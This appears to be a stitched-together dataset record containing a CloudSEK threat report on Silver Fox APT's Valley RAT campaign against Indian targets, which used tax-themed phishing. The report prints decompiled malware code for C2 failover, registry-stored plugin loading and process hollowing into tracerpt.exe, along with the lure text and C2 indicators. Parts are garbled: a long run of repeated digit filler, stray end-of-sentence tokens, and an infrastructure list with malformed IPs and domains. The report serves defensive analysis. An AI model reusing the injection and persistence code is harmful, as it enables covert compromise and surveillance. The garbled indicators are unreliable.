\n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "DisableWindowsUpdateService();LogStatus((char*)&Format_6);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "CreateThread(0, 0, StartAddress, 0, 0, 0);\nsub_10003E6E(v13);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif 